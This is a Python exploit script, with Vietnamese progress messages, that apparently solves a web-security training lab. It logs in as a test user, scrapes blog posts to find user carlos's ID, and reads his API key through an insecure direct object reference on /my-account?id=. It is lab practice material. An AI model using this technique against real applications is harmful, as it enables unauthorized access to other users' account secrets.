import requests
import re
from bs4 import BeautifulSoup
import sys

target='YOUR_URL'

def submit(x):
    print("=== Tien hanh lay API key ===")
    res_get_token=session.get(target+f"/my-account?id={x}")
    soup=BeautifulSoup(res_get_token.text, 'html.parser')
    match=re.search(r"Your API Key is:\s*(.*?)</div>", res_get_token.text)
    if match:
        api_key=match.group(1)
        print(f"[*] API Key: {api_key}")
    else:
        print("[!] KHong tim thay API key")
        return

    print("=== Tien hanh submit answer ===")
    res_submit=session.post(target+'/submitSolution', data={
        "answer": api_key
    })

headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br"
}

session=requests.Session()
session.headers.update(headers)

print("=== Tien hanh dang nhap ===")
res_get_csrf=session.get(target+'/login')
soup=BeautifulSoup(res_get_csrf.text, "html.parser")
csrf_token=soup.find("input", {"name": "csrf"})["value"]
print(f"[*] CSRF Token: {csrf_token}")

res_login=session.post(target+'/login', data={
    "csrf": csrf_token,
    "username" : "wiener",
    "password" : "peter"
},allow_redirects=True)

print(res_login.status_code)
print(res_login.text)

for i in range(1,20):
    path_exploit=f"/post?postId={i}"
    res=session.get(target+path_exploit)
    soup = BeautifulSoup(res.text, 'html.parser')
    link = soup.find('span', id='blog-author').find('a')
    user_id = link['href'].split('userId=')[-1]
    user_name = link.text.strip()
    if user_name=="carlos":
        submit(user_id)
        break
        